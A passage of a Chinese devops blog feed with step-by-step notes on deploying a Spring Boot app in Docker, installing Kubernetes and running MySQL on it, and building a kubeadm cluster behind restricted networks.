<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@docker ms]<span class="comment"># docker run -p 9090:9090 -t xwolf/ms</span></span><br><span class="line">docker: Error response from daemon: driver failed programming external connectivity on endpoint stupefied_heisenberg (4717abc21b53d821163cf04c723c95a7a0c82a6faaa540fe7554053c2ed43bca):  (iptables failed: iptables --<span class="built_in">wait</span> -t nat -A DOCKER -p tcp -d 0/0 --dport 9090 -j DNAT --to-destination 172.17.0.2:9090 ! -i docker0: iptables: No chain/target/match by that name.</span><br><span class="line"> (<span class="built_in">exit</span> status 1)).</span><br></pre></td></tr></table></figure>
<p>抛出了一个异常,但是docker container是创建成功的。 咱们的防火墙是关闭的。启动防火墙，重新启动docker container</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 启动防火墙</span></span><br><span class="line">[root@docker ms]<span class="comment"># systemctl start firewalld.service</span></span><br><span class="line"></span><br><span class="line">[root@docker ms]<span class="comment"># docker ps -a</span></span><br><span class="line">CONTAINER ID        IMAGE                 COMMAND                  CREATED             STATUS                    PORTS               NAMES</span><br><span class="line">d6901f34d5b8        xwolf/ms              <span class="string">"/bin/sh -c 'java -j…"</span>   9 minutes ago       Created                                       vigorous_ishizaka</span><br><span class="line">ffff9fdbe1f2        consul                <span class="string">"docker-entrypoint.s…"</span>   2 months ago        Exited (1) 2 months ago                       node1</span><br><span class="line">c3a9f6d71ad2        rabbitmq:management   <span class="string">"docker-entrypoint.s…"</span>   2 months ago        Exited (0) 30 hours ago                       rabbitmq</span><br><span class="line"><span class="comment"># 启动容器 </span></span><br><span class="line">[root@docker ms]<span class="comment"># docker start d6901f34d5b8</span></span><br><span class="line">d6901f34d5b8</span><br></pre></td></tr></table></figure>
<p>访问一下地址,正常就可以看到返回值。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@docker ms]<span class="comment"># curl http://localhost:9090</span></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">"timestamp"</span>:<span class="string">"2019-03-06T15:29:18.134+0000"</span>,<span class="string">"status"</span>:404,<span class="string">"error"</span>:<span class="string">"Not Found"</span>,<span class="string">"message"</span>:<span class="string">"No message available"</span>,<span class="string">"path"</span>:<span class="string">"/"</span>&#125;[root@docker ms]<span class="comment"># curl http://localhost:9090/hello</span></span><br><span class="line">Hello Docker</span><br></pre></td></tr></table></figure>
<p>进入到容器，即可看到jar存放的位置，日志等自己查看吧。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">[root@docker ms]<span class="comment"># docker exec -it d6901f34d5b8 /bin/bash</span></span><br><span class="line">root@d6901f34d5b8:/opt/data<span class="comment">#</span></span><br><span class="line">root@d6901f34d5b8:/opt/data<span class="comment">#</span></span><br><span class="line">root@d6901f34d5b8:/opt/data<span class="comment"># ls</span></span><br><span class="line">ms-0.0.1-SNAPSHOT.jar</span><br></pre></td></tr></table></figure>
<p>至此,docker 部署spring boot的过程搞完了。</p>
]]></content>
      <categories>
        <category>devops</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>k8s安装以及mysql安装实战</title>
    <url>/2019/03/15/devops/k8s%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8Amysql%E5%AE%89%E8%A3%85%E5%AE%9E%E6%88%98/</url>
    <content><![CDATA[<p>Kubernetes 是一个开源的，用于管理云平台中多个主机上的容器化的应用，Kubernetes 的目标是让部署容器化的应用简单并且高效（powerful）,Kubernetes 提供了应用部署，规划，更新，维护的一种机制。</p>
<p>Kubernetes 一个核心的特点就是能够自主的管理容器来保证云平台中的容器按照用户的期望状态运行着（比如用户想让 apache 一直运行，用户不需要关心怎么去做，Kubernetes 会自动去监控，然后去重启，新建，总之，让 apache 一直提供服务），管理员可以加载一个微型服务，让规划器来找到合适的位置，同时，Kubernetes 也系统提升工具以及人性化方面，让用户能够方便的部署自己的应用（就像 canary deployments）。</p>
<p>现在 Kubernetes 着重于不间断的服务状态（比如 web 服务器或者缓存服务器）和原生云平台应用（Nosql）,在不久的将来会支持各种生产云平台中的各种服务，例如，分批，工作流，以及传统数据库。<br><a id="more"></a><br>在 Kubenetes 中，所有的容器均在 Pod 中运行,一个 Pod 可以承载一个或者多个相关的容器，在后边的案例中，同一个 Pod 中的容器会部署在同一个物理机器上并且能够共享资源。一个 Pod 也可以包含 O 个或者多个磁盘卷组（volumes）,这些卷组将会以目录的形式提供给一个容器，或者被所有 Pod 中的容器共享，对于用户创建的每个 Pod,系统会自动选择那个健康并且有足够容量的机器，然后创建类似容器的容器,当容器创建失败的时候，容器会被 node agent 自动的重启,这个 node agent 叫 kubelet,但是，如果是 Pod 失败或者机器，它不会自动的转移并且启动，除非用户定义了 replication controller。</p>
<p>用户可以自己创建并管理 Pod,Kubernetes 将这些操作简化为两个操作：基于相同的 Pod 配置文件部署多个 Pod 复制品；创建可替代的 Pod 当一个 Pod 挂了或者机器挂了的时候。而 Kubernetes API 中负责来重新启动，迁移等行为的部分叫做“replication controller”，它根据一个模板生成了一个 Pod,然后系统就根据用户的需求创建了许多冗余，这些冗余的 Pod 组成了一个整个应用，或者服务，或者服务中的一层。一旦一个 Pod 被创建，系统就会不停的监控 Pod 的健康情况以及 Pod 所在主机的健康情况，如果这个 Pod 因为软件原因挂掉了或者所在的机器挂掉了，replication controller 会自动在一个健康的机器上创建一个一摸一样的 Pod,来维持原来的 Pod 冗余状态不变，一个应用的多个 Pod 可以共享一个机器。</p>
<p>我们经常需要选中一组 Pod，例如，我们要限制一组 Pod 的某些操作，或者查询某组 Pod 的状态，作为 Kubernetes 的基本机制，用户可以给 Kubernetes Api 中的任何对象贴上一组 key:value 的标签，然后，我们就可以通过标签来选择一组相关的 Kubernetes Api 对象，然后去执行一些特定的操作，每个资源额外拥有一组（很多） keys 和 values,然后外部的工具可以使用这些 keys 和 vlues 值进行对象的检索，这些 Map 叫做 annotations（注释）。</p>
<p>Kubernetes 支持一种特殊的网络模型，Kubernetes 创建了一个地址空间，并且不动态的分配端口，它可以允许用户选择任何想使用的端口，为了实现这个功能，它为每个 Pod 分配 IP 地址。</p>
<p>现代互联网应用一般都会包含多层服务构成，比如 web 前台空间与用来存储键值对的内存服务器以及对应的存储服务，为了更好的服务于这样的架构，Kubernetes 提供了服务的抽象，并提供了固定的 IP 地址和 DNS 名称，而这些与一系列 Pod 进行动态关联，这些都通过之前提到的标签进行关联，所以我们可以关联任何我们想关联的 Pod，当一个 Pod 中的容器访问这个地址的时候，这个请求会被转发到本地代理（kube proxy）,每台机器上均有一个本地代理，然后被转发到相应的后端容器。Kubernetes 通过一种轮训机制选择相应的后端容器，这些动态的 Pod 被替换的时候,Kube proxy 时刻追踪着，所以，服务的 IP 地址（dns 名称），从来不变。</p>
<p>所有 Kubernetes 中的资源，比如 Pod,都通过一个叫 URI 的东西来区分，这个 URI 有一个 UID,URI 的重要组成部分是：对象的类型（比如 pod），对象的名字，对象的命名空间，对于特殊的对象类型，在同一个命名空间内，所有的名字都是不同的，在对象只提供名称，不提供命名空间的情况下，这种情况是假定是默认的命名空间。UID 是时间和空间上的唯一。</p>
<h1 id="安装-k8s"><a href="#安装-k8s" class="headerlink" title="安装 k8s"></a>安装 k8s</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">## 安装etcd 和 kubernetes</span></span><br><span class="line">[root@docker ~]<span class="comment"># yum install -y etcd kubernetes</span></span><br><span class="line">已加载插件：fastestmirror</span><br><span class="line">Determining fastest mirrors</span><br><span class="line">epel/x86_64/metalink                                                                            | 9.0 kB  00:00:00</span><br><span class="line"> * base: mirrors.huaweicloud.com</span><br><span class="line"> * epel: mirror.premi.st</span><br><span class="line"> * extras: mirrors.163.com</span><br><span class="line"> * updates: mirrors.163.com</span><br><span class="line">base                                                                                            | 3.6 kB  00:00:00</span><br><span class="line">docker-ce-nightly                                                                               | 3.5 kB  00:00:00</span><br></pre></td></tr></table></figure>
<p><img src="/2019/03/15/devops/k8s安装以及mysql安装实战/k8s_20190315104501.png" alt></p>
<p>安装过程中可已经安装的 docker 冲突,所以先卸载已经安装过的 docker。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看安装的docker</span></span><br><span class="line">yum list installed | grep docker</span><br><span class="line"></span><br><span class="line"><span class="comment"># 卸载docker包</span></span><br><span class="line">yum -y remove docker-engine.x86_64</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除容器、镜像信息</span></span><br><span class="line">rm -rf /var/lib/docker</span><br><span class="line"></span><br><span class="line">rm -rf /etc/systemd/system/docker.service.d</span><br></pre></td></tr></table></figure>
<p>再次执行上述命令安装 k8s,直至成功。<br>验证一下，查看 k8s 版本信息:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@mysql mysql]<span class="comment"># kubectl version</span></span><br><span class="line">Client Version: version.Info&#123;Major:<span class="string">"1"</span>, Minor:<span class="string">"5"</span>, GitVersion:<span class="string">"v1.5.2"</span>, GitCommit:<span class="string">"269f928217957e7126dc87e6adfa82242bfe5b1e"</span>, GitTreeState:<span class="string">"clean"</span>, BuildDate:<span class="string">"2017-07-03T15:31:10Z"</span>, GoVersion:<span class="string">"go1.7.4"</span>, Compiler:<span class="string">"gc"</span>, Platform:<span class="string">"linux/amd64"</span>&#125;</span><br><span class="line">Server Version: version.Info&#123;Major:<span class="string">"1"</span>, Minor:<span class="string">"5"</span>, GitVersion:<span class="string">"v1.5.2"</span>, GitCommit:<span class="string">"269f928217957e7126dc87e6adfa82242bfe5b1e"</span>, GitTreeState:<span class="string">"clean"</span>, BuildDate:<span class="string">"2017-07-03T15:31:10Z"</span>, GoVersion:<span class="string">"go1.7.4"</span>, Compiler:<span class="string">"gc"</span>, Platform:<span class="string">"linux/amd64"</span>&#125;</span><br></pre></td></tr></table></figure>
<h1 id="安装-mysql"><a href="#安装-mysql" class="headerlink" title="安装 mysql"></a>安装 mysql</h1><h2 id="编写配置描述文件"><a href="#编写配置描述文件" class="headerlink" title="编写配置描述文件"></a>编写配置描述文件</h2><h3 id="rc-文件"><a href="#rc-文件" class="headerlink" title="rc 文件"></a>rc 文件</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ReplicationController</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line"><span class="attr">  name:</span> <span class="string">mysql-rc</span></span><br><span class="line"><span class="attr">  labels:</span></span><br><span class="line"><span class="attr">    name:</span> <span class="string">mysql-rc</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line"><span class="attr">  replicas:</span> <span class="number">1</span></span><br><span class="line"><span class="attr">  selector:</span></span><br><span class="line"><span class="attr">    app:</span> <span class="string">mysql-pod</span></span><br><span class="line"><span class="attr">  template:</span></span><br><span class="line"><span class="attr">    metadata:</span></span><br><span class="line"><span class="attr">      labels:</span></span><br><span class="line"><span class="attr">        app:</span> <span class="string">mysql-pod</span></span><br><span class="line"><span class="attr">    spec:</span></span><br><span class="line"><span class="attr">      containers:</span></span><br><span class="line"><span class="attr">        - name:</span> <span class="string">mysql</span></span><br><span class="line"><span class="attr">          image:</span> <span class="attr">mysql:8.0.15</span></span><br><span class="line"><span class="attr">          ports:</span></span><br><span class="line"><span class="attr">            - containerPort:</span> <span class="number">3306</span></span><br><span class="line"><span class="attr">          env:</span></span><br><span class="line"><span class="attr">            - name:</span> <span class="string">MYSQL_ROOT_PASSWORD</span></span><br><span class="line"><span class="attr">              value:</span> <span class="string">"123456"</span></span><br></pre></td></tr></table></figure>
<h3 id="svc-文件"><a href="#svc-文件" class="headerlink" title="svc 文件"></a>svc 文件</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Service</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line"><span class="attr">  name:</span> <span class="string">mysql-svc</span></span><br><span class="line"><span class="attr">  labels:</span></span><br><span class="line"><span class="attr">    name:</span> <span class="string">mysql-svc</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line"><span class="attr">  type:</span> <span class="string">NodePort</span></span><br><span class="line"><span class="attr">  ports:</span></span><br><span class="line"><span class="attr">    - port:</span> <span class="number">3306</span></span><br><span class="line"><span class="attr">      targetPort:</span> <span class="number">3306</span></span><br><span class="line"><span class="attr">      nodePort:</span> <span class="number">30306</span></span><br><span class="line"><span class="attr">      name:</span> <span class="string">http</span></span><br><span class="line"><span class="attr">      protocol:</span> <span class="string">TCP</span></span><br><span class="line"><span class="attr">  selector:</span></span><br><span class="line"><span class="attr">    name:</span> <span class="string">mysql-pod</span></span><br></pre></td></tr></table></figure>
<h2 id="创建-rc、service"><a href="#创建-rc、service" class="headerlink" title="创建 rc、service"></a>创建 rc、service</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">## 创建</span></span><br><span class="line">[root@mysql mysql]<span class="comment"># kubectl create -f mysql-rc.yaml</span></span><br><span class="line">replicationcontroller <span class="string">"mysql"</span> created</span><br><span class="line"></span><br><span class="line"><span class="comment">## 创建service</span></span><br><span class="line">[root@mysql mysql]<span class="comment"># kubectl create -f mysql-svc.yaml</span></span><br><span class="line">service <span class="string">"mysql-svc"</span> created</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取实例</span></span><br><span class="line">[root@mysql mysql]<span class="comment"># kubectl get rc</span></span><br><span class="line">NAME      DESIRED   CURRENT   READY     AGE</span><br><span class="line">mysql     1         0         0         32s</span><br><span class="line"><span class="comment"># 获取pods</span></span><br><span class="line">[root@mysql mysql]<span class="comment"># kubectl get pods</span></span><br><span class="line">No resources found.</span><br></pre></td></tr></table></figure>
<ol>
<li>vim /etc/kubernetes/apiserver</li>
<li>找到这一行 “KUBE_ADMISSION_CONTROL=”—admission_control=NamespaceLifecycle,NamespaceExists,LimitRanger,SecurityContextDeny,ServiceAccount,ResourceQuota” ,去掉 ServiceAccount，保存退出。</li>
<li>重新启动 kube-apiserver 服务即可。</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@mysql mysql]<span class="comment"># kubectl get pods</span></span><br><span class="line">NAME          READY     STATUS              RESTARTS   AGE</span><br><span class="line">mysql-z3925   0/1       ContainerCreating   0          12s</span><br></pre></td></tr></table></figure>
<p>可见,可正常获取 pod。一直显示为 ContainerCreating 状态，容器创建中。需要下载镜像，等待状态变为 Running 即可。<br>但是等了 20min 还是创建中,查看 pod 的详细信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看详细信息</span></span><br><span class="line"> kubectl describe pod mysql-z3925</span><br></pre></td></tr></table></figure>
<p>出现了如下错误信息:<br><img src="/2019/03/15/devops/k8s安装以及mysql安装实战/k8s_20190315105630.png" alt></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/etc/docker/certs.d/registry.access.redhat.com/redhat-ca.crt</span><br></pre></td></tr></table></figure>
<p>这个文件不存在。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 下载证书rpm</span></span><br><span class="line"> wget http://mirror.centos.org/centos/7/os/x86_64/Packages/python-rhsm-certificates-1.19.10-1.el7_4.x86_64.rpm</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成证书</span></span><br><span class="line">rpm2cpio python-rhsm-certificates-1.19.10-1.el7_4.x86_64.rpm | cpio -iv --to-stdout ./etc/rhsm/ca/redhat-uep.pem | tee /etc/rhsm/ca/redhat-uep.pem</span><br><span class="line"></span><br><span class="line"><span class="comment">## 安装pod-infrastructure</span></span><br><span class="line">docker pull registry.access.redhat.com/rhel7/pod-infrastructure:latest</span><br></pre></td></tr></table></figure>
<p>删除创建的 rc ,pod 重新创建</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 删除创建RC,service</span></span><br><span class="line">kubectl delete -f mysql-rc.yaml</span><br><span class="line">kubectl delete -f mysql-svc.yaml</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新创建RC</span></span><br><span class="line">kubectl create -f mysql-rc.yaml</span><br><span class="line">kubectl create -f mysql-svc.yaml</span><br></pre></td></tr></table></figure>
<p>过一会可见 pod 处于 Running 状态.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@mysql mysql]<span class="comment"># kubectl get pod</span></span><br><span class="line">NAME          READY     STATUS    RESTARTS   AGE</span><br><span class="line">mysql-hh8jw   1/1       Running   0          8m</span><br></pre></td></tr></table></figure>
<p>进入 mysql</p>
<p><img src="/2019/03/15/devops/k8s安装以及mysql安装实战/k8s_20190315112740.png" alt></p>
<p>修改密码,以便客户端可以正常连接。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">user</span> <span class="string">'root'</span>@<span class="string">'%'</span> <span class="keyword">identified</span> <span class="keyword">with</span> mysql_native_password <span class="keyword">by</span> <span class="string">'123456'</span>;</span><br></pre></td></tr></table></figure>
<p>查看字符集</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; SHOW VARIABLES LIKE <span class="string">'%chara%'</span>;</span><br><span class="line">+--------------------------+--------------------------------+</span><br><span class="line">| Variable_name            | Value                          |</span><br><span class="line">+--------------------------+--------------------------------+</span><br><span class="line">| character_set_client     | latin1                         |</span><br><span class="line">| character_set_connection | latin1                         |</span><br><span class="line">| character_set_database   | utf8mb4                        |</span><br><span class="line">| character_set_filesystem | binary                         |</span><br><span class="line">| character_set_results    | latin1                         |</span><br><span class="line">| character_set_server     | utf8mb4                        |</span><br><span class="line">| character_set_system     | utf8                           |</span><br><span class="line">| character_sets_dir       | /usr/share/mysql-8.0/charsets/ |</span><br><span class="line">+--------------------------+--------------------------------+</span><br><span class="line">8 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.06 sec)</span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure>
<p>进入容器,编辑 mysql.cnf</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi /etc/mysql/conf.d/mysql.cnf</span><br></pre></td></tr></table></figure>
<p>在 mysql 节点下添加一句话,修改默认字符集为 utf8.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">default-character-set = utf8</span><br></pre></td></tr></table></figure>
<p>重启容器即可。</p>
<p>mysql 对外开发的端口为 30306,客户端连接即可,至此 mysql 安装结束。</p>
]]></content>
      <categories>
        <category>devops</category>
      </categories>
      <tags>
        <tag>k8s</tag>
      </tags>
  </entry>
  <entry>
    <title>k8s集群安装</title>
    <url>/2019/03/20/devops/k8s%E9%9B%86%E7%BE%A4%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<h1 id="master-安装"><a href="#master-安装" class="headerlink" title="master 安装"></a>master 安装</h1><p>安装 kubernetes 的时候，需要安装 kubelet, kubeadm 等包，但 k8s 官网给的 yum 源是 packages.cloud.google.com，国内访问不了。修改配置使用 aliyun 的镜像源来下载 kubernetes:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@bogon ~]<span class="comment"># vim /etc/yum.repos.d/kubernetes.repo</span></span><br><span class="line"></span><br><span class="line">[kubernetes]</span><br><span class="line">name=Kubernetes Repo</span><br><span class="line">baseurl=https://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64/</span><br><span class="line">gpgcheck=1</span><br><span class="line">gpgkey=https://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg</span><br><span class="line">enabled=1</span><br></pre></td></tr></table></figure>
<p>安装 docker kubelet kubeadm kubectl kubernetes-cni</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install -y docker kubelet kubeadm kubectl kubernetes-cni</span><br></pre></td></tr></table></figure>
<p>发现 kubectl 不能安装<br><img src="/2019/03/20/devops/k8s集群安装/k8s_20190320133356.png" alt></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@bogon ~]<span class="comment"># yum install ansible</span></span><br><span class="line">[root@bogon ~]<span class="comment"># ansible all -k -m shell -a "curl -O https://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpg &amp;&amp; rpm --import rpm-package-key.gpg"</span></span><br><span class="line">SSH password:</span><br><span class="line"> [WARNING]: Consider using the get_url or uri module rather than running <span class="string">'curl'</span>.  If you need to use <span class="built_in">command</span></span><br><span class="line">because get_url or uri is insufficient you can add <span class="string">'warn: false'</span> to this <span class="built_in">command</span> task or <span class="built_in">set</span></span><br><span class="line"><span class="string">'command_warnings=False'</span> <span class="keyword">in</span> ansible.cfg to get rid of this message.</span><br><span class="line"></span><br><span class="line">192.168.19.127 | CHANGED | rc=0 &gt;&gt;</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100   975  100   975    0     0    165      0  0:00:05  0:00:05 --:--:--   289</span><br></pre></td></tr></table></figure>
<p>再次执行上边的命令安装 kubectl。<br>安装成功后启动 docker,kubelet 并设置开启启动:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@hadoop01 ~]<span class="comment"># systemctl enable docker &amp;&amp; systemctl start docker</span></span><br><span class="line">Created symlink from /etc/systemd/system/multi-user.target.wants/docker.service to /usr/lib/systemd/system/docker.service.</span><br><span class="line">[root@hadoop01 ~]<span class="comment"># systemctl enable kubelet &amp;&amp; systemctl start kubelet</span></span><br><span class="line">Created symlink from /etc/systemd/system/multi-user.target.wants/kubelet.service to /etc/systemd/system/kubelet.service.</span><br></pre></td></tr></table></figure>
<p>下面开始初始化 master</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kubeadm init --kubernetes-version=v1.13.0</span><br></pre></td></tr></table></figure>
<blockquote>
<ul>
<li>—kubernetes-version 指定只用的 k8s 版本信息</li>
</ul>
</blockquote>
<p>出现下面的错误,<br><img src="/2019/03/20/devops/k8s集群安装/k8s_error_20190320140015.png" alt><br><img src="/2019/03/20/devops/k8s集群安装/k8s_error_20190320141949.png" alt></p>
<ol>
<li>cpu 核心数太低,因为用的虚拟机。直接修改 CPU 核心数。</li>
<li>/proc/sys/net/bridge/bridge-nf-call-iptables 内容不是 1，这是修改为 1</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/bridge/bridge-nf-call-iptables</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/bridge/bridge-nf-call-ip6tables</span><br></pre></td></tr></table></figure>
<ol>
<li>swap 禁用的问题,加上参数 —ignore-preflight-errors=Swap ，忽略这个错误</li>
</ol>
<p>解决上述问题后，继续执行初始化命令:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">kubeadm init --kubernetes-version=v1.13.0 --ignore-preflight-errors=Swap</span><br></pre></td></tr></table></figure>
<p>又出错了,如下信息.<br><img src="/2019/03/20/devops/k8s集群安装/k8s_timeout_20190320142611.png" alt><br><img src="/2019/03/20/devops/k8s集群安装/k8s_timeout_20190320151230.png" alt></p>
<p>显示超时，被墙了。这里采用先下载镜像，最后修改 tag 来解决这个问题，一定要保证版本的一致性。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull mirrorgooglecontainers/kube-apiserver-amd64:v1.13.0</span><br><span class="line">docker pull mirrorgooglecontainers/kube-controller-manager-amd64:v1.13.0</span><br><span class="line">docker pull mirrorgooglecontainers/kube-scheduler-amd64:v1.13.0</span><br><span class="line">docker pull mirrorgooglecontainers/kube-proxy-amd64:v1.13.0</span><br><span class="line">docker pull mirrorgooglecontainers/pause:3.1</span><br><span class="line">docker pull mirrorgooglecontainers/etcd-amd64:3.2.24</span><br><span class="line">docker pull coredns/coredns:1.2.6</span><br></pre></td></tr></table></figure>
<p>修改 tag 信息.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker tag  docker.io/mirrorgooglecontainers/kube-apiserver-amd64:v1.13.0 k8s.gcr.io/kube-apiserver:v1.13.0</span><br><span class="line">docker tag  docker.io/mirrorgooglecontainers/kube-controller-manager-amd64:v1.13.0 k8s.gcr.io/kube-controller-manager:v1.13.0</span><br><span class="line">docker tag  docker.io/mirrorgooglecontainers/kube-scheduler-amd64:v1.13.0 k8s.gcr.io/kube-scheduler:v1.13.0</span><br><span class="line">docker tag  docker.io/mirrorgooglecontainers/kube-proxy-amd64:v1.13.0 k8s.gcr.io/kube-proxy:v1.13.0</span><br><span class="line">docker tag  docker.io/mirrorgooglecontainers/pause:3.1 k8s.gcr.io/pause:3.1</span><br><span class="line">docker tag  docker.io/mirrorgooglecontainers/etcd-amd64:3.2.24 k8s.gcr.io/etcd:3.2.24</span><br><span class="line">docker tag  docker.io/coredns/coredns:1.2.6 k8s.gcr.io/coredns:1.2.6</span><br></pre></td></tr></table></figure>
<p>再次执行初始化命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># kubeadm init --kubernetes-version=v1.13.0 --ignore-preflight-errors=Swap</span></span><br></pre></td></tr></table></figure>
<p>显示如下信息表示初始化成功.</p>
<p><img src="/2019/03/20/devops/k8s集群安装/k8s_init_20190320153724.png" alt></p>
<p>按照提示执行如下操作:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># mkdir -p $HOME/.kube</span></span><br><span class="line">[root@localhost ~]<span class="comment"># sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config</span></span><br><span class="line">[root@localhost ~]<span class="comment"># sudo chown $(id -u):$(id -g) $HOME/.kube/config</span></span><br></pre></td></tr></table></figure>
<p>至此 master 已安装配置 OK,但是集群中没有可用的 Node 和网络配置。下面继续。</p>
<h1 id="Node-安装"><a href="#Node-安装" class="headerlink" title="Node 安装"></a>Node 安装</h1><p>执行在 master 初始化成功后的信息来加入子节点</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@hadoop02 ~]<span class="comment"># kubeadm join 192.168.19.130:6443 --token 2w4n77.m9dopqud2y4usegr --discovery-token-ca-cert-hash sha256:6f2c3732e14a7d20bbd64f402640b1f31078c7bf3c3144792d49d407fe7ccc4e --ignore-preflight-errors=Swap</span></span><br><span class="line">[preflight] Running pre-flight checks</span><br><span class="line">        [WARNING Swap]: running with swap on is not supported. Please <span class="built_in">disable</span> swap</span><br><span class="line">        [WARNING SystemVerification]: this Docker version is not on the list of validated versions: 18.09.3. Latest validated version: 18.06</span><br><span class="line">[discovery] Trying to connect to API Server <span class="string">"192.168.19.130:6443"</span></span><br><span class="line">[discovery] Created cluster-info discovery client, requesting info from <span class="string">"https://192.168.19.130:6443"</span></span><br><span class="line">[discovery] Requesting info from <span class="string">"https://192.168.19.130:6443"</span> again to validate TLS against the pinned public key</span><br><span class="line">[discovery] Cluster info signature and contents are valid and TLS certificate validates against pinned roots, will use API Server <span class="string">"192.168.19.130:6443"</span></span><br><span class="line">[discovery] Successfully established connection with API Server <span class="string">"192.168.19.130:6443"</span></span><br><span class="line">[join] Reading configuration from the cluster...</span><br><span class="line">[join] FYI: You can look at this config file with <span class="string">'kubectl -n kube-system get cm kubeadm-config -oyaml'</span></span><br></pre></td></tr></table></figure>
<p>但是最后出现了下面的错误信息,kubelet 检查失败。</p>
<p><img src="/2019/03/20/devops/k8s集群安装/k8s_join_20190320163031.png" alt><br>发现 kubelet 服务一直没启动起来<br><img src="/2019/03/20/devops/k8s集群安装/k8s_kubelet_20190320163321.png" alt></p>
<p>查看日志信息 tail -f /var/log/messages,</p>
<p><img src="/2019/03/20/devops/k8s集群安装/k8s_log_20190320163549.png" alt><br>还是 swap 没有禁用的错误信息。<br>修改 kubelet 参数信息后即可,</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@hadoop02 ~]<span class="comment"># vim /etc/sysconfig/kubelet</span></span><br><span class="line">KUBELET_EXTRA_ARGS=<span class="string">"--fail-swap-on=false"</span></span><br></pre></td></tr></table></figure>
<p>重启 kubelet 服务后发现服务已正常运行。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@hadoop02 ~]<span class="comment"># systemctl restart kubelet</span></span><br><span class="line">[root@hadoop02 ~]<span class="comment"># systemctl status kubelet</span></span><br><span class="line">● kubelet.service - kubelet: The Kubernetes Node Agent</span><br><span class="line">   Loaded: loaded (/etc/systemd/system/kubelet.service; enabled; vendor preset: disabled)</span><br><span class="line">  Drop-In: /etc/systemd/system/kubelet.service.d</span><br><span class="line">           └─10-kubeadm.conf</span><br><span class="line">   Active: active (running) since Thu 2019-03-21 00:42:41 CST; 7s ago</span><br><span class="line">     Docs: https://kubernetes.io/docs/</span><br><span class="line"> Main PID: 51971 (kubelet)</span><br><span class="line">    Tasks: 20</span><br><span class="line">   Memory: 32.1M</span><br></pre></td></tr></table></figure>
<p>再次执行加入集群的命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># kubeadm join 192.168.19.130:6443 --token 2w4n77.m9dopqud2y4usegr --discovery-token-ca-cert-hash sha256:6f2c3732e14a7d20bbd64f402640b1f31078c7bf3c3144792d49d407fe7ccc4e --ignore-preflight-errors=Swap</span></span><br></pre></td></tr></table></figure>
<p>还是有错误<br><img src="/2019/03/20/devops/k8s集群安装/k8s_node_20190320164524.png" alt><br>文件已经存在了,并且端口被占用。杀掉进程、删除文件再次加入集群。<br><img src="/2019/03/20/devops/k8s集群安装/k8s_node_success_20190320165121.png" alt></p>
